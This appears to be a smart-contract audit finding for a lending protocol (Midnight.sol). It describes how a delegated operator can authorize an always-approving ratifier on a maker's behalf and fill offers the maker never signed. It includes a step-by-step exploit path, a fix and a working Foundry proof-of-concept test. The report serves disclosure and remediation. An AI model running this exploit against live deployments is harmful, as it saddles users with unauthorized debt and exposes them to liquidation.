### Title
Authorized Operator Can Authorize Malicious Ratifier on Behalf of Maker, Enabling Arbitrary-Terms Take Execution - (File: src/Midnight.sol)

### Summary

`Midnight.setIsAuthorized` is fully transitive: any address already authorized by a maker can call it with `onBehalf = maker` to authorize an arbitrary third address, including a malicious ratifier contract. Because `Midnight.take` only checks `isAuthorized[offer.maker][offer.ratifier]` and then blindly trusts the ratifier's return value, an authorized attacker can install a ratifier that unconditionally returns `CALLBACK_SUCCESS`, then construct and fill offers with completely arbitrary terms (market, price, amount) that the maker never signed or approved.

### Finding Description

**Root cause — two cooperating weaknesses:**

**1. Transitive authorization in `setIsAuthorized`** [1](#0-0) 

The guard is `onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender]`. An attacker who satisfies the second branch (already authorized by the maker) can write any value into `isAuthorized[maker][X]` for any `X`, including a freshly deployed malicious ratifier.

**2. `take` trusts the ratifier unconditionally once it is authorized** [2](#0-1) 

There is no check that the offer was signed by the maker, that the ratifier was authorized by the maker directly (vs. by a delegate), or that the ratifier actually inspects the offer content. The only gate is (a) `isAuthorized[maker][ratifier]` and (b) the ratifier's return value.

**Exact exploit path:**

```
Precondition: isAuthorized[maker][attacker] == true

Step 1: attacker deploys MaliciousRatifier
        → isRatified(Offer, bytes) always returns CALLBACK_SUCCESS

Step 2: attacker calls midnight.setIsAuthorized(address(maliciousRatifier), true, maker)
        → guard passes: isAuthorized[maker][attacker] == true
        → state: isAuthorized[maker][maliciousRatifier] = true

Step 3: attacker constructs Offer{
            maker:     maker,
            ratifier:  maliciousRatifier,
            buy:       false,          // maker becomes seller/borrower
            market:    <any market>,
            tick:      <any tick>,     // arbitrary interest rate
            maxUnits:  type(uint256).max,
            expiry:    far future,
            group:     fresh bytes32   // bypasses consumed cap
        }

Step 4: attacker calls midnight.take(offer, hex"", units, attacker, attacker, address(0), hex"")
        → line 346: taker == msg.sender ✓
        → line 354: offer.maker != taker ✓
        → line 355: isAuthorized[maker][maliciousRatifier] == true ✓
        → line 356: maliciousRatifier.isRatified(...) == CALLBACK_SUCCESS ✓
        → line 375: buyer = attacker, seller = maker
        → line 414: maker's debt increases by `units` at attacker-chosen rate
```

The `IsRatifiedCallback` contract already present in the test suite is exactly this malicious ratifier: [3](#0-2) 

as is `DummyRatifier`: [4](#0-3) 

No other check in `take` blocks this path. The `consumed` cap is bypassed by using a fresh `offer.group`. The `enterGate` check is bypassed by using a market with `enterGate == address(0)`. The `SelfTake` check is satisfied because `attacker != maker`.

### Impact Explanation

With `offer.buy = false` the maker is cast as the seller (borrower): `sellerDebtIncrease` is written to `position[id][maker].debt` at a tick chosen entirely by the attacker. [5](#0-4) 

The maker accumulates debt at an arbitrary interest rate in an arbitrary market, without ever signing or approving those terms. If the attacker picks a tick corresponding to a very high rate, the maker's position becomes immediately unhealthy and liquidatable. With `offer.buy = true` the maker is forced into a lender position at an attacker-chosen (potentially zero) rate, draining yield. Both outcomes constitute unauthorized borrowing or lending at arbitrary terms on behalf of the maker.

### Likelihood Explanation

**Preconditions:**
- Attacker must already be in `isAuthorized[maker][attacker]`. This is a realistic operational state: users authorize keeper bots, portfolio managers, or smart-contract routers for routine operations (collateral management, repayment, etc.) without expecting that authorization to be fully transitive into ratifier installation.
- Attacker must be able to deploy a contract (trivially true on any EVM chain).

**Feasibility:** The entire attack is a two-transaction sequence (deploy + `setIsAuthorized`, then `take`). It is deterministic, requires no special timing, and is repeatable across any market. No oracle manipulation or impossible values are needed.

### Recommendation

Break the transitivity of ratifier authorization. The simplest targeted fix is to require that `isAuthorized[offer.maker][offer.ratifier]` was set **directly by the maker** (i.e., `onBehalf == msg.sender` at the time of the `setIsAuthorized` call), not by a delegate. This can be implemented by maintaining a separate mapping `isRatifierAuthorizedByMakerDirectly[maker][ratifier]` that is only written when `onBehalf == msg.sender`, and replacing the check in `take` with that mapping. Alternatively, restrict `setIsAuthorized` so that the `authorized` address cannot be an `IRatifier` implementation unless `onBehalf == msg.sender`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {IMidnight, Offer, Market, CollateralParams} from "../src/interfaces/IMidnight.sol";
import {IRatifier} from "../src/interfaces/IRatifier.sol";
import {CALLBACK_SUCCESS} from "../src/libraries/ConstantsLib.sol";
import {MAX_TICK} from "../src/libraries/TickLib.sol";

contract AlwaysRatifier is IRatifier {
    function isRatified(Offer memory, bytes memory) external pure returns (bytes32) {
        return CALLBACK_SUCCESS;
    }
}

contract MaliciousRatifierTest is BaseTest {
    function testAuthorizedAttackerBypassesRatifier() public {
        // Setup market
        Market memory mkt;
        mkt.loanToken = address(loanToken);
        mkt.maturity  = vm.getBlockTimestamp() + 100;
        mkt.collateralParams.push(CollateralParams({
            token: address(collateralToken1),
            lltv: 0.77e18,
            maxLif: maxLif(0.77e18, 0.25e18),
            oracle: address(oracle1)
        }));

        address maker   = lender;   // victim
        address attacker = borrower; // already authorized by maker

        // Precondition: maker authorizes attacker
        vm.prank(maker);
        midnight.setIsAuthorized(attacker, true, maker);

        // Step 1: deploy always-returning ratifier
        AlwaysRatifier malRatifier = new AlwaysRatifier();

        // Step 2: attacker authorizes malicious ratifier ON BEHALF OF maker
        vm.prank(attacker);
        midnight.setIsAuthorized(address(malRatifier), true, maker);
        assertTrue(midnight.isAuthorized(maker, address(malRatifier)));

        // Step 3: construct sell offer (maker = seller/borrower) with arbitrary terms
        Offer memory offer;
        offer.buy      = false;                    // maker becomes borrower
        offer.maker    = maker;
        offer.ratifier = address(malRatifier);
        offer.maxUnits = type(uint256).max;
        offer.market   = mkt;
        offer.expiry   = vm.getBlockTimestamp() + 99;
        offer.tick     = MAX_TICK;                 // attacker-chosen rate
        offer.group    = keccak256("fresh");       // fresh group, no consumed cap

        // Attacker is the buyer/lender; supply loan tokens via deal
        deal(address(loanToken), attacker, 1e18);
        vm.prank(attacker);
        loanToken.approve(address(midnight), type(uint256).max);

        uint256 units = 1000;

        // Step 4: take executes — maker never signed these terms
        vm.prank(attacker);
        midnight.take(offer, hex"", units, attacker, attacker, address(0), hex"");

        bytes32 id = midnight.toId(mkt);

        // Assert: maker now has debt at attacker-chosen terms
        assertGt(midnight.debtOf(id, maker), 0, "maker has unauthorized debt");
        // Assert: attacker has credit (lender position)
        assertGt(midnight.creditOf(id, attacker), 0, "attacker has credit");
    }
}
```

**Expected assertions:** `maker` carries non-zero debt in a market and at a rate it never signed; `attacker` holds the matching credit. The test passes without any revert, proving the invariant is broken.
